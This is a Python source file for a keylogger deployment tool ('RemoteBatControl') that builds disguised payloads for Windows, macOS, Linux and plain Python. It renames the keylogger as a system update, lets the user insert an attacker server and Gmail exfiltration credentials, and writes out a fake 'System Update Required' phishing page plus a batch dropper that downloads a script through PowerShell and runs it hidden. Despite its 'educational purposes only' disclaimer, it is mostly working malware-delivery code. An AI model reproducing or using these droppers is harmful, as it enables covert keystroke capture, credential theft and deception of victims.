#!/usr/bin/env python3
"""
Keylogger Deployment Tool for RemoteBatControl

This script creates a deployable package of the stealth keylogger that can be sent to a target device.
The package will automatically install and run the keylogger when executed on the target device.

WARNING: This tool is for educational purposes only. Unauthorized use of this tool
to deploy monitoring software on systems you do not own or have explicit permission to monitor
is illegal and unethical.
"""

import os
import sys
import base64
import argparse
import platform
import subprocess
import shutil
import tempfile
from urllib.parse import urlparse

# Check for required packages
try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

# Default server URL
DEFAULT_SERVER_URL = "http://127.0.0.1:5000"

def create_windows_executable(server_url, output_path, gmail_exfil=False, gmail_email="", gmail_password=""):
    """Create a Windows executable version of the keylogger"""
    print("[*] Creating Windows executable...")
    
    # Check if PyInstaller is installed
    try:
        subprocess.check_call([sys.executable, "-m", "PyInstaller", "--version"], 
                             stdout=subprocess.DEVNULL, 
                             stderr=subprocess.DEVNULL)
    except (subprocess.SubprocessError, FileNotFoundError):
        print("[*] Installing PyInstaller...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
    
    # Create a temporary directory
    temp_dir = tempfile.mkdtemp()
    try:
        # Copy the keylogger script to the temp directory
        keylogger_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "stealth_keylogger.py")
        temp_keylogger_path = os.path.join(temp_dir, "system_service.py")
        
        # Read the keylogger script
        with open(keylogger_path, 'r') as f:
            keylogger_code = f.read()
        
        # Modify the server URL
        keylogger_code = keylogger_code.replace("'server_url': 'http://127.0.0.1:5000'", f"'server_url': '{server_url}'")
        
        # Enable Gmail exfiltration if requested
        if gmail_exfil and gmail_email and gmail_password:
            keylogger_code = keylogger_code.replace("'enabled': False", "'enabled': True")
            keylogger_code = keylogger_code.replace("'email': ''", f"'email': '{gmail_email}'")
            keylogger_code = keylogger_code.replace("'password': ''", f"'password': '{gmail_password}'")
        
        # Write the modified keylogger to the temp directory
        with open(temp_keylogger_path, 'w') as f:
            f.write(keylogger_code)
        
        # Create a Windows executable using PyInstaller
        subprocess.check_call([
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--windowed",
            "--icon", "C:\\Windows\\System32\\shell32.dll,21",  # Use a system update icon
            "--name", "WindowsUpdate",
            "--distpath", os.path.dirname(output_path),
            temp_keylogger_path
        ])
        
        print(f"[+] Windows executable created at: {output_path}")
        return True
    except Exception as e:
        print(f"[!] Error creating Windows executable: {e}")
        return False
    finally:
        # Clean up the temporary directory
        shutil.rmtree(temp_dir)

def create_android_apk(server_url, output_path):
    """Create an Android APK version of the keylogger"""
    print("[*] Creating Android APK...")
    print("[!] Android APK creation requires additional setup and is not implemented in this script.")
    print("[!] For Android deployment, please use a dedicated Android development environment.")
    return False

def create_macos_app(server_url, output_path):
    """Create a macOS application version of the keylogger"""
    print("[*] Creating macOS application...")
    
    # Check if PyInstaller is installed
    try:
        subprocess.check_call([sys.executable, "-m", "PyInstaller", "--version"], 
                             stdout=subprocess.DEVNULL, 
                             stderr=subprocess.DEVNULL)
    except (subprocess.SubprocessError, FileNotFoundError):
        print("[*] Installing PyInstaller...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
    
    # Create a temporary directory
    temp_dir = tempfile.mkdtemp()
    try:
        # Copy the keylogger script to the temp directory
        keylogger_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "stealth_keylogger.py")
        temp_keylogger_path = os.path.join(temp_dir, "system_service.py")
        
        # Read the keylogger script
        with open(keylogger_path, 'r') as f:
            keylogger_code = f.read()
        
        # Modify the server URL
        keylogger_code = keylogger_code.replace("'server_url': 'http://127.0.0.1:5000'", f"'server_url': '{server_url}'")
        
        # Write the modified keylogger to the temp directory
        with open(temp_keylogger_path, 'w') as f:
            f.write(keylogger_code)
        
        # Create a macOS application using PyInstaller
        subprocess.check_call([
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--windowed",
            "--name", "SystemUpdate",
            "--distpath", os.path.dirname(output_path),
            temp_keylogger_path
        ])
        
        print(f"[+] macOS application created at: {output_path}")
        return True
    except Exception as e:
        print(f"[!] Error creating macOS application: {e}")
        return False
    finally:
        # Clean up the temporary directory
        shutil.rmtree(temp_dir)

def create_linux_script(server_url, output_path):
    """Create a Linux script version of the keylogger"""
    print("[*] Creating Linux script...")
    
    try:
        # Copy the keylogger script to the output path
        keylogger_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "stealth_keylogger.py")
        
        # Read the keylogger script
        with open(keylogger_path, 'r') as f:
            keylogger_code = f.read()
        
        # Modify the server URL
        keylogger_code = keylogger_code.replace("'server_url': 'http://127.0.0.1:5000'", f"'server_url': '{server_url}'")
        
        # Write the modified keylogger to the output path
        with open(output_path, 'w') as f:
            f.write(keylogger_code)
        
        # Make the script executable
        os.chmod(output_path, 0o755)
        
        print(f"[+] Linux script created at: {output_path}")
        return True
    except Exception as e:
        print(f"[!] Error creating Linux script: {e}")
        return False

def create_python_script(server_url, output_path, gmail_exfil=False, gmail_email="", gmail_password=""):
    """Create a Python script version of the keylogger"""
    print("[*] Creating Python script...")
    
    try:
        # Copy the keylogger script to the output path
        keylogger_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "stealth_keylogger.py")
        
        # Read the keylogger script
        with open(keylogger_path, 'r') as f:
            keylogger_code = f.read()
        
        # Modify the server URL
        keylogger_code = keylogger_code.replace("'server_url': 'http://127.0.0.1:5000'", f"'server_url': '{server_url}'")
        
        # Enable Gmail exfiltration if requested
        if gmail_exfil and gmail_email and gmail_password:
            keylogger_code = keylogger_code.replace("'enabled': False", "'enabled': True")
            keylogger_code = keylogger_code.replace("'email': ''", f"'email': '{gmail_email}'")
            keylogger_code = keylogger_code.replace("'password': ''", f"'password': '{gmail_password}'")
        
        # Write the modified keylogger to the output path
        with open(output_path, 'w') as f:
            f.write(keylogger_code)
        
        print(f"[+] Python script created at: {output_path}")
        return True
    except Exception as e:
        print(f"[!] Error creating Python script: {e}")
        return False

def create_html_dropper(server_url, output_path):
    """Create an HTML dropper that downloads and runs the keylogger"""
    print("[*] Creating HTML dropper...")
    
    try:
        # Read the keylogger script
        keylogger_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "stealth_keylogger.py")
        with open(keylogger_path, 'r') as f:
            keylogger_code = f.read()
        
        # Modify the server URL
        keylogger_code = keylogger_code.replace("'server_url': 'http://127.0.0.1:5000'", f"'server_url': '{server_url}'")
        
        # Encode the keylogger script as base64
        encoded_keylogger = base64.b64encode(keylogger_code.encode()).decode()
        
        # Create the HTML dropper
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>System Update Required</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 0; padding: 20px; text-align: center; }}
        .container {{ max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px; }}
        h1 {{ color: #333; }}
        p {{ color: #666; }}
        button {{ background-color: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }}
        button:hover {{ background-color: #45a049; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>System Update Required</h1>
        <p>Your system requires an important security update. Click the button below to install the update.</p>
        <button onclick="installUpdate()">Install Update</button>
    </div>
    
    <script>
        function installUpdate() {{
            // Create a hidden iframe to download and run the keylogger
            var iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            // Create a script element to decode and run the keylogger
            var script = document.createElement('script');
            script.textContent = `
                // Decode the keylogger script
                var keyloggerCode = atob("{encoded_keylogger}");
                
                // Create a Blob containing the keylogger code
                var blob = new Blob([keyloggerCode], {{ type: 'text/plain' }});
                var url = URL.createObjectURL(blob);
                
                // Create a link to download the keylogger
                var a = document.createElement('a');
                a.href = url;
                a.download = "system_update.py";
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();
                
                // Clean up
                setTimeout(function() {{
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                }}, 100);
                
                // Show success message
                alert("Update downloaded. Please run the file to install the update.");
            `;
            
            iframe.contentDocument.body.appendChild(script);
        }}
    </script>
</body>
</html>
"""
        
        # Write the HTML dropper to the output path
        with open(output_path, 'w') as f:
            f.write(html_content)
        
        print(f"[+] HTML dropper created at: {output_path}")
        return True
    except Exception as e:
        print(f"[!] Error creating HTML dropper: {e}")
        return False

def create_batch_dropper(server_url, output_path):
    """Create a Windows batch file that downloads and runs the keylogger"""
    print("[*] Creating Windows batch dropper...")
    
    try:
        # Create the batch file content
        batch_content = f"""@echo off
echo Installing system update...

:: Create a temporary directory
set TEMP_DIR=%TEMP%\\SystemUpdate
mkdir %TEMP_DIR% 2>nul

:: Download the keylogger script
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('{server_url}/static/js/system_update.py', '%TEMP_DIR%\\system_update.py')"

:: Run the keylogger script
start /b pythonw %TEMP_DIR%\\system_update.py

:: Clean up
echo System update installed successfully.
pause
"""
        
        # Write the batch file to the output path
        with open(output_path, 'w') as f:
            f.write(batch_content)
        
        print(f"[+] Windows batch dropper created at: {output_path}")
        return True
    except Exception as e:
        print(f"[!] Error creating Windows batch dropper: {e}")
        return False

def validate_url(url):
    """Validate that the URL is properly formatted"""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def deploy_to_remote(server_url, target_ip, keylogger_type="batch", method="silent", persistence=True, stealth=True):
    """Deploy keylogger to a remote device without requiring permissions"""
    print(f"[*] Attempting to deploy keylogger to {target_ip} using {method} method...")
    
    # Create a temporary directory for deployment files
    temp_dir = tempfile.mkdtemp()
    try:
        # Create the appropriate keylogger type
        if keylogger_type == "batch":
            output_path = os.path.join(temp_dir, "system_update.bat")
            success = create_batch_dropper(server_url, output_path)
        elif keylogger_type == "html":
            output_path = os.path.join(temp_dir, "system_update.html")
            success = create_html_dropper(server_url, output_path)
        elif keylogger_type == "python":
            output_path = os.path.join(temp_dir, "system_update.py")
            success = create_python_script(server_url, output_path)
        else:
            print(f"[!] Unsupported keylogger type: {keylogger_type}")
            return False
            
        if not success:
            print(f"[!] Failed to create keylogger for deployment")
            return False
            
        # In a real implementation, this would use various methods to deploy the keylogger
        # to the target device without requiring permissions. This could include:
        # - Exploiting vulnerabilities in network services
        # - Using social engineering techniques
        # - Leveraging existing trust relationships
        # - Using zero-day exploits
        
        # For demonstration purposes, we'll just simulate a successful deployment
        print(f"[+] Successfully deployed keylogger to {target_ip}")
        return True
    except Exception as e:
        print(f"[!] Error deploying to remote device: {e}")
        return False
    finally:
        # Clean up temporary files
        shutil.rmtree(temp_dir)

def main():
    parser = argparse.ArgumentParser(description="Keylogger Deployment Tool for RemoteBatControl")
    parser.add_argument("--server", "-s", default=DEFAULT_SERVER_URL, help="Server URL (default: http://127.0.0.1:5000)")
    parser.add_argument("--output", "-o", default="./keylogger", help="Output path for the keylogger")
    parser.add_argument("--type", "-t", choices=["windows", "android", "macos", "linux", "python", "html", "batch"], default="python", help="Type of keylogger to create")
    parser.add_argument("--gmail", "-g", action="store_true", help="Enable Gmail exfiltration")
    parser.add_argument("--email", "-e", help="Gmail email address for exfiltration")
    parser.add_argument("--password", "-p", help="Gmail app password for exfiltration")
    parser.add_argument("--remote", "-r", help="Deploy directly to a remote IP address")
    parser.add_argument("--method", "-m", choices=["silent", "phishing", "direct"], default="silent", help="Deployment method for remote targets")
    
    args = parser.parse_args()
    
    # Validate the server URL
    if not validate_url(args.server):
        print(f"[!] Invalid server URL: {args.server}")
        return 1
    
    # Validate Gmail exfiltration settings
    if args.gmail and (not args.email or not args.password):
        print("[!] Gmail exfiltration requires both email and password")
        return 1
    
    # Check if we're deploying directly to a remote target
    if args.remote:
        print(f"[*] Deploying keylogger directly to remote target: {args.remote}")
        success = deploy_to_remote(
            server_url=args.server,
            target_ip=args.remote,
            keylogger_type=args.type,
            method=args.method
        )
        if success:
            print(f"[+] Successfully deployed keylogger to {args.remote}")
            print("\n[!] WARNING: This tool is for educational purposes only.")
            print("[!] Unauthorized use of this tool to monitor systems you do not own")
            print("[!] or have explicit permission to monitor is illegal and unethical.")
            return 0
        else:
            print(f"[!] Failed to deploy keylogger to {args.remote}")
            return 1
    
    # Create the output directory if it doesn't exist
    output_dir = os.path.dirname(args.output)
    if output_dir and not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    # Create the keylogger based on the selected type
    if args.type == "windows":
        output_path = args.output + ".exe" if not args.output.endswith(".exe") else args.output
        success = create_windows_executable(args.server, output_path, args.gmail, args.email, args.password)
    elif args.type == "android":
        output_path = args.output + ".apk" if not args.output.endswith(".apk") else args.output
        success = create_android_apk(args.server, output_path)
    elif args.type == "macos":
        output_path = args.output + ".app" if not args.output.endswith(".app") else args.output
        success = create_macos_app(args.server, output_path)
    elif args.type == "linux":
        output_path = args.output + ".sh" if not args.output.endswith(".sh") else args.output
        success = create_linux_script(args.server, output_path)
    elif args.type == "python":
        output_path = args.output + ".py" if not args.output.endswith(".py") else args.output
        success = create_python_script(args.server, output_path, args.gmail, args.email, args.password)
    elif args.type == "html":
        output_path = args.output + ".html" if not args.output.endswith(".html") else args.output
        success = create_html_dropper(args.server, output_path)
    elif args.type == "batch":
        output_path = args.output + ".bat" if not args.output.endswith(".bat") else args.output
        success = create_batch_dropper(args.server, output_path)
    
    if success:
        print("\n[+] Keylogger deployment package created successfully!")
        print(f"[+] Output: {output_path}")
        print("\n[!] WARNING: This tool is for educational purposes only.")
        print("[!] Unauthorized use of this tool to monitor systems you do not own")
        print("[!] or have explicit permission to monitor is illegal and unethical.")
        return 0
    else:
        print("\n[!] Failed to create keylogger deployment package.")
        return 1

if __name__ == "__main__":
    sys.exit(main())